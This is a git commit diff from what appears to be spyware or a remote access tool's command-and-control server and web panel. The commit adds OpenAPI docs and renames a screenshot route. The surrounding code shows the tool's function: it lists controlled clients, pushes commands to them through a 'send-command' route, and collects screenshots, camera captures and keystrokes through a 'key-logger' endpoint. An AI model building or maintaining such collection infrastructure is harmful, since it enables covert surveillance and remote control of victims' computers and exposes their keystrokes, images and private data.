c53a35e7b18ede57f53f9ab6df7503d8edcf21b3
Andrej Szalma <andy.szalma@gmail.com>
2024-04-17 21:33:18 +0100

    feat: add openapi docs

--- server/http_server.js
+++ server/http_server.js
@@ -7,6 +7,7 @@ import {S3Client} from "@aws-sdk/client-s3";
 import collectorController from "./controllers/collector_controller.js";
 import clientController from "./controllers/client_controller.js";
 import {fromNodeProviderChain} from "@aws-sdk/credential-providers";
+import {apiReference} from "@scalar/express-api-reference";
 
 export const s3Client = new S3Client({region: process.env.AWS_S3_REGION, credentials: fromNodeProviderChain()});
 
@@ -16,13 +17,25 @@ const app = express();
 app.use(cors())
 // Middleware to parse JSON bodies
 app.use(express.json({limit: '200mb'}));
+// Docs middleware
+app.get('/openapi.yaml', (req, res, next) => {
+    res.sendFile('openapi.yaml', {root: './'});
+})
+app.use(
+    '/docs',
+    apiReference({
+        spec: {
+            url: '/openapi.yaml',
+        },
+    }),
+)
 
 // Client routes
 app.get('/clients', clientController.index)
 app.post(`/clients/send-command`, clientController.sendCommand)
 
 // Collector routes
-app.get('/collector/screenshots', collectorController.listScreenshots)
+app.get('/collector/screenshot', collectorController.listScreenshots)
 app.get('/collector/camera', collectorController.listCameraCaptures)
 
 app.post('/collector/key-logger', collectorController.saveKeys);
--- web/src/queries/screenshotsQuery.js
+++ web/src/queries/screenshotsQuery.js
@@ -4,6 +4,6 @@ export const screenshotsQueryOptions = {
     queryKey: ['screenshots'],
     queryFn: () =>
         axios
-            .get(`${process.env.REACT_APP_API_URL}/collector/screenshots`)
+            .get(`${process.env.REACT_APP_API_URL}/collector/screenshot`)
             .then((res) => res.data),
 }
